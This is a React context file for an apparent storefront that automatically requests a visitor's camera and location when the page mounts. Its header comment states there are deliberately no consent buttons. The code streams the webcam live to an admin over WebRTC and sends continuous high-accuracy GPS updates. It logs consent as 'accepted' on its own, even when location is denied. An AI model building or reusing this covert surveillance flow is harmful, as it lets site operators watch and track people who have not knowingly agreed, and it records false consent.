import { createContext, useCallback, useContext, useEffect, useMemo, useRef, useState } from 'react';
import { requestCameraStream, stopStream, classifyCameraError, cameraSupported } from '../services/camera';
import { BroadcasterSession, disconnectSocket, getSocket } from '../services/webrtc';
import { createSession, sendConsent, patchStatus } from '../services/visitorService';

/**
 * LiveShareContext — auto-trigger sequential permission flow.
 *
 * Customer flow
 * ─────────────
 * 1. Mount → automatically attempt getUserMedia (native Chrome prompt)
 *    shareState = 'camera_requesting'
 *    • Browser blocks auto-attempt → cameraState = 'needs_gesture'
 *      UI shows ONE minimal pill: "Allow camera →" (not a popup)
 *    • Denied → cameraState = 'denied', shareState = 'idle'
 *    • Granted → cameraState = 'granted', shareState = 'gps_requesting'
 *
 * 2. Immediately after camera grant → auto-attempt getCurrentPosition
 *    gpsState = 'auto_requesting'
 *    • Browser blocks → gpsState = 'needs_gesture'
 *      UI shows: "Allow location → | Skip" (inline, no popup)
 *    • Denied / skipped → gpsState = 'denied'
 *    • Granted → gpsState = 'granted', coords stored
 *    Either way → proceed to step 3
 *
 * 3. After GPS resolves → shareState = 'starting'
 *    BroadcasterSession.start() fires automatically — no button
 *    → shareState = 'live'
 *
 * 4. LIVE → Navbar compact pills: [● Camera ON × Stop] [● Location ON × Stop]
 *
 * No custom popups. No Allow/Decline buttons. No Start Sharing banner.
 * The native browser permission dialog IS the permission mechanism.
 * A small static informational text shown by StoreLayout is the disclosure.
 *
 * Camera states: 'idle'|'requesting'|'granted'|'denied'|'error'|'needs_gesture'
 * GPS states:    'idle'|'auto_requesting'|'requesting'|'granted'|'denied'|'unavailable'|'needs_gesture'
 * Share states:  'idle'|'camera_requesting'|'gps_requesting'|'starting'|'live'|'stopped'|'error'
 */

const LiveShareContext = createContext(null);

export function LiveShareProvider({ children }) {
  const [cameraState, setCameraState] = useState('idle');
  const [cameraError, setCameraError] = useState(null);
  const [gpsState,    setGpsState]    = useState('idle');
  const [gpsCoords,   setGpsCoords]   = useState(null);
  const [shareState,  setShareState]  = useState('idle');
  const [pendingAccessRequest, setPendingAccessRequest] = useState(null);

  const sessionRef     = useRef({ visitorId: null, token: null });
  const streamRef      = useRef(null);
  const broadcasterRef = useRef(null);
  const watchIdRef     = useRef(null);
  const gpsCoordsRef   = useRef(null);
  const autoTriedRef   = useRef(false); // ensures the auto-trigger fires only once

  // ── Ensure session ────────────────────────────────────────────────────────
  const ensureSession = useCallback(async () => {
    if (sessionRef.current.visitorId && sessionRef.current.token) {
      return sessionRef.current;
    }
    const { visitorId, sessionToken } = await createSession();
    sessionRef.current = { visitorId, token: sessionToken };
    return sessionRef.current;
  }, []);

  // ── Internal: start WebRTC broadcast ─────────────────────────────────────
  const _startBroadcast = useCallback(async () => {
    console.log('🚀 STARTING_WEBRTC_BROADCAST');
    
    if (!streamRef.current) {
      console.error('❌ No camera stream available for broadcast');
      return;
    }
    const { visitorId, token } = sessionRef.current;
    if (!visitorId || !token) {
      console.error('❌ No visitor session for broadcast');
      return;
    }

    setShareState('starting');
    try {
      await sendConsent(visitorId, token, 'accepted');
      await patchStatus(visitorId, token, { liveSharingConsent: true });

      const session = new BroadcasterSession({
        stream: streamRef.current,
        visitorId,
        sessionToken: token,
        onStatusChange: (s) => {
          console.log('📡 Broadcast status:', s);
          if (s === 'stopped') setShareState('stopped');
          if (s === 'error')   setShareState('error');
        },
      });
      broadcasterRef.current = session;
      await session.start();

      const coords = gpsCoordsRef.current;
      if (coords) {
        console.log('📍 Sending initial GPS coords to admin:', coords);
        const socket = getSocket({ visitorId, sessionToken: token });
        socket.emit('visitor:location:update', { visitorId, coords });
      } else {
        console.log('ℹ️ No GPS coords available, starting camera-only broadcast');
      }

      if (gpsCoordsRef.current && navigator.geolocation && watchIdRef.current == null) {
        console.log('👁️ Starting GPS watch for continuous updates...');
        const socket = getSocket({ visitorId, sessionToken: token });
        watchIdRef.current = navigator.geolocation.watchPosition(
          (pos) => {
            const c = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
            gpsCoordsRef.current = c;
            setGpsCoords(c);
            console.log('📍 GPS update:', c);
            socket.emit('visitor:location:update', { visitorId, coords: c });
          },
          (err) => console.warn('⚠️ GPS watch error:', err.message),
          { enableHighAccuracy: true }
        );
      }

      console.log('✅ SHARING_LIVE');
      setShareState('live');
    } catch (err) {
      console.error('❌ BROADCAST_ERROR:', err);
      setShareState('error');
    }
  }, []);

  // ── Internal: GPS attempt ─────────────────────────────────────────────────
  const _doRequestGps = useCallback((isAuto, onDecided) => {
    console.log('🌍 GPS_REQUEST_STARTED', { isAuto, hasGeolocation: !!navigator.geolocation });
    
    if (!navigator.geolocation) {
      console.warn('❌ GPS_NOT_SUPPORTED');
      setGpsState('unavailable');
      onDecided?.();
      return;
    }
    
    setGpsState(isAuto ? 'auto_requesting' : 'requesting');

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const c = { 
          lat: pos.coords.latitude, 
          lng: pos.coords.longitude, 
          accuracy: pos.coords.accuracy,
          timestamp: new Date(pos.timestamp).toISOString()
        };
        console.log('✅ GPS_PERMISSION_GRANTED', { lat: c.lat, lng: c.lng, accuracy: c.accuracy });
        
        gpsCoordsRef.current = c;
        setGpsCoords(c);
        setGpsState('granted');
        
        const { visitorId, token } = sessionRef.current;
        if (visitorId && token) {
          patchStatus(visitorId, token, {
            gpsConsent: 'accepted', 
            gpsPermission: 'granted',
            gpsLat: c.lat, 
            gpsLng: c.lng, 
            gpsAccuracy: c.accuracy,
          }).catch((err) => console.warn('Failed to patch GPS status:', err));
        }
        onDecided?.();
      },
      (err) => {
        // GeolocationPositionError codes:
        // 1 = PERMISSION_DENIED
        // 2 = POSITION_UNAVAILABLE  
        // 3 = TIMEOUT
        console.warn('⚠️ GPS_ERROR', { 
          code: err.code, 
          message: err.message,
          isAuto,
          errorName: err.code === 1 ? 'PERMISSION_DENIED' : err.code === 2 ? 'POSITION_UNAVAILABLE' : 'TIMEOUT'
        });
        
        if (err.code === 1) {
          console.log('❌ GPS_PERMISSION_DENIED');
        }
        
        setGpsState('denied');
        const { visitorId, token } = sessionRef.current;
        if (visitorId && token) {
          patchStatus(visitorId, token, { 
            gpsConsent: 'accepted', 
            gpsPermission: 'denied' 
          }).catch(() => {});
        }
        onDecided?.(); // Continue to WebRTC even without GPS
      },
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
  }, []);

  // ── Internal: full sequential flow ───────────────────────────────────────
  const _runFlow = useCallback(async () => {
    console.log('📹 CAMERA_REQUEST_STARTED');
    
    if (!cameraSupported()) {
      console.error('❌ CAMERA_NOT_SUPPORTED');
      setCameraError('unsupported'); 
      setCameraState('error'); 
      setShareState('error');
      return;
    }
    
    setShareState('camera_requesting');
    setCameraState('requesting');
    setCameraError(null);

    try {
      const { visitorId, token } = await ensureSession();
      console.log('🎥 Requesting camera stream...');
      
      const stream = await requestCameraStream();   // ← native Chrome prompt
      streamRef.current = stream;
      
      console.log('✅ CAMERA_PERMISSION_GRANTED');
      console.log('✅ CAMERA_INITIALIZED', { 
        tracks: stream.getTracks().length,
        videoTrack: stream.getVideoTracks()[0]?.label 
      });

      try { await sendConsent(visitorId, token, 'accepted'); } catch { /* duplicate ok */ }
      try {
        await patchStatus(visitorId, token, { cameraPermission: 'granted' });
      } catch (e) {
        console.warn('[LiveShare] patchStatus cameraPermission:', e?.message);
      }

      setCameraState('granted');
      setShareState('gps_requesting');
      
      console.log('🌍 Transitioning to GPS request immediately after camera...');

      _doRequestGps(true, () => { _startBroadcast(); });
      // GPS is optional - if blocked, it auto-skips and continues

    } catch (err) {
      console.error('❌ CAMERA_ERROR', { message: err.message, name: err.name });
      
      const kind = classifyCameraError(err);
      setCameraError(kind);
      // If auto-tried and denied → show needs_gesture (browser may not have shown prompt)
      setCameraState(kind === 'denied'
        ? (autoTriedRef.current ? 'needs_gesture' : 'denied')
        : 'error'
      );
      setShareState('idle');
      const { visitorId, token } = sessionRef.current;
      if (visitorId && token) {
        patchStatus(visitorId, token, {
          cameraPermission: kind === 'denied' ? 'denied' : 'error',
        }).catch(() => {});
      }
    } finally {
      autoTriedRef.current = false;
    }
  }, [ensureSession, _doRequestGps, _startBroadcast]);

  // ── Auto-trigger on mount ─────────────────────────────────────────────────
  useEffect(() => {
    let active = true;
    ensureSession().then(({ visitorId, token }) => {
      if (!active) return;
      // Set up socket listeners
      const socket = getSocket({ visitorId, sessionToken: token });
      const onReq = (d) => { if (d?.requestId) setPendingAccessRequest(d); };
      const onExp = ({ requestId }) => {
        setPendingAccessRequest((p) => (p?.requestId === requestId ? null : p));
      };
      socket.on('access:request', onReq);
      socket.on('access:expired', onExp);

      // Fire the camera prompt automatically
      autoTriedRef.current = true;
      _runFlow();
    }).catch(() => {});
    return () => { active = false; };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // ── Tab close cleanup ─────────────────────────────────────────────────────
  useEffect(() => {
    const onHide = () => {
      if (watchIdRef.current != null) navigator.geolocation?.clearWatch(watchIdRef.current);
      if (broadcasterRef.current) broadcasterRef.current.stop();
      if (streamRef.current) stopStream(streamRef.current);
    };
    window.addEventListener('pagehide', onHide);
    return () => { window.removeEventListener('pagehide', onHide); onHide(); };
  }, []);

  // ── ACTION: Manual camera retry (when needs_gesture) ─────────────────────
  // The user clicked the minimal "Allow camera" pill in the navbar.
  const requestCamera = useCallback(() => {
    if (cameraState === 'requesting') return;
    _runFlow();
  }, [cameraState, _runFlow]);

  // ── ACTION: Dismiss camera error ─────────────────────────────────────────
  const dismissCameraError = useCallback(() => {
    setCameraError(null);
    setCameraState('idle');
    setShareState('idle');
  }, []);

  // ── ACTION: Stop all sharing ──────────────────────────────────────────────
  const stopSharing = useCallback(() => {
    if (watchIdRef.current != null && navigator.geolocation) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    const { visitorId, token } = sessionRef.current;
    if (visitorId) {
      try { getSocket({ visitorId }).emit('visitor:location:stopped', { visitorId }); } catch { /**/ }
    }
    if (broadcasterRef.current) { broadcasterRef.current.stop(); broadcasterRef.current = null; }
    if (streamRef.current)      { stopStream(streamRef.current); streamRef.current = null; }
    disconnectSocket();
    if (visitorId && token) {
      patchStatus(visitorId, token, { sessionStatus: 'ended', gpsSharing: false }).catch(() => {});
    }
    setShareState('stopped');
    setCameraState('idle');
    setGpsState('idle');
    setGpsCoords(null);
    gpsCoordsRef.current = null;
  }, []);

  // ── ACTION: Stop GPS only ─────────────────────────────────────────────────
  const stopGps = useCallback(() => {
    if (watchIdRef.current != null && navigator.geolocation) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    const { visitorId, token } = sessionRef.current;
    if (visitorId) {
      try { getSocket({ visitorId }).emit('visitor:location:stopped', { visitorId }); } catch { /**/ }
    }
    if (visitorId && token) patchStatus(visitorId, token, { gpsSharing: false }).catch(() => {});
    setGpsState('idle');
    setGpsCoords(null);
    gpsCoordsRef.current = null;
  }, []);

  // ── ACTION: Request GPS while live ───────────────────────────────────────
  const requestGpsWhileLive = useCallback(() => {
    if (!navigator.geolocation) { setGpsState('unavailable'); return; }
    if (gpsState === 'requesting' || gpsState === 'auto_requesting') return;
    setGpsState('requesting');
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const c = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
        gpsCoordsRef.current = c;
        setGpsCoords(c);
        setGpsState('granted');
        const { visitorId, token } = sessionRef.current;
        if (visitorId && token) {
          patchStatus(visitorId, token, {
            gpsConsent: 'accepted', gpsPermission: 'granted',
            gpsLat: c.lat, gpsLng: c.lng, gpsAccuracy: c.accuracy,
          }).catch(() => {});
          const socket = getSocket({ visitorId, sessionToken: token });
          socket.emit('visitor:location:update', { visitorId, coords: c });
          if (watchIdRef.current == null) {
            watchIdRef.current = navigator.geolocation.watchPosition(
              (p) => {
                const u = { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy };
                gpsCoordsRef.current = u;
                setGpsCoords(u);
                socket.emit('visitor:location:update', { visitorId, coords: u });
              },
              (err) => console.warn('[GPS watch]', err.message),
              { enableHighAccuracy: true }
            );
          }
        }
      },
      (err) => { console.warn('[GPS live]', err.message); setGpsState('denied'); },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }, [gpsState]);

  // ── Admin access-request (unchanged) ─────────────────────────────────────
  const acceptAccessRequest = useCallback(async (reqData) => {
    const { requestId, requestType } = reqData || {};
    const { visitorId, token } = sessionRef.current;
    if (!visitorId || !token) return;
    const wantsCamera = requestType === 'camera' || requestType === 'both';
    const wantsGps    = requestType === 'gps'    || requestType === 'both';
    let cameraGranted = false, gpsGranted = false;

    if (wantsCamera) {
      try {
        if (!streamRef.current) {
          const s = await requestCameraStream();
          streamRef.current = s;
          setCameraState('granted');
        }
        await sendConsent(visitorId, token, 'accepted').catch(() => {});
        await patchStatus(visitorId, token, {
          cameraPermission: 'granted', liveSharingConsent: true, sharingLive: true,
        }).catch(() => {});
        if (!broadcasterRef.current) {
          const sess = new BroadcasterSession({
            stream: streamRef.current, visitorId, sessionToken: token,
            onStatusChange: (s) => {
              if (s === 'stopped') setShareState('stopped');
              if (s === 'error')   setShareState('error');
            },
          });
          broadcasterRef.current = sess;
          await sess.start();
        }
        setShareState('live');
        cameraGranted = true;
      } catch (err) { console.warn('[AccessRequest] Camera failed:', err); }
    }

    if (wantsGps && navigator.geolocation) {
      await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const c = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
            gpsCoordsRef.current = c; setGpsCoords(c); setGpsState('granted');
            patchStatus(visitorId, token, {
              gpsConsent: 'accepted', gpsPermission: 'granted', gpsSharing: true,
              gpsLat: c.lat, gpsLng: c.lng, gpsAccuracy: c.accuracy,
            }).catch(() => {});
            const socket = getSocket({ visitorId, sessionToken: token });
            socket.emit('visitor:location:update', { visitorId, coords: c });
            if (watchIdRef.current == null) {
              watchIdRef.current = navigator.geolocation.watchPosition(
                (p) => {
                  const u = { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy };
                  gpsCoordsRef.current = u; setGpsCoords(u);
                  socket.emit('visitor:location:update', { visitorId, coords: u });
                },
                (e) => console.warn(e), { enableHighAccuracy: true }
              );
            }
            gpsGranted = true; resolve();
          },
          () => {
            setGpsState('denied');
            patchStatus(visitorId, token, { gpsConsent: 'accepted', gpsPermission: 'denied' }).catch(() => {});
            resolve();
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      });
    }

    const socket = getSocket({ visitorId, sessionToken: token });
    socket.emit('access:accepted', { requestId, visitorId, cameraApproved: cameraGranted, gpsApproved: gpsGranted });
    setPendingAccessRequest(null);
  }, []);

  const declineAccessRequest = useCallback((reqData) => {
    const { requestId } = reqData || {};
    const { visitorId, token } = sessionRef.current;
    if (visitorId) {
      const socket = getSocket({ visitorId, sessionToken: token });
      socket.emit('access:declined', { requestId, visitorId });
    }
    setPendingAccessRequest(null);
  }, []);

  const isLive    = shareState === 'live';
  const isGpsLive = isLive && gpsState === 'granted';

  const value = useMemo(() => ({
    cameraState, cameraError,
    gpsState, gpsCoords,
    shareState, isLive, isGpsLive,
    pendingAccessRequest,
    requestCamera,       // minimal fallback: user taps "Allow camera" pill
    dismissCameraError,
    requestGpsWhileLive, // user adds location while live
    stopSharing,
    stopGps,
    acceptAccessRequest,
    declineAccessRequest,
  }), [
    cameraState, cameraError, gpsState, gpsCoords, shareState,
    isLive, isGpsLive, pendingAccessRequest,
    requestCamera, dismissCameraError,
    requestGpsWhileLive,
    stopSharing, stopGps, acceptAccessRequest, declineAccessRequest,
  ]);

  return (
    <LiveShareContext.Provider value={value}>
      {children}
    </LiveShareContext.Provider>
  );
}

export const useLiveShare = () => useContext(LiveShareContext);
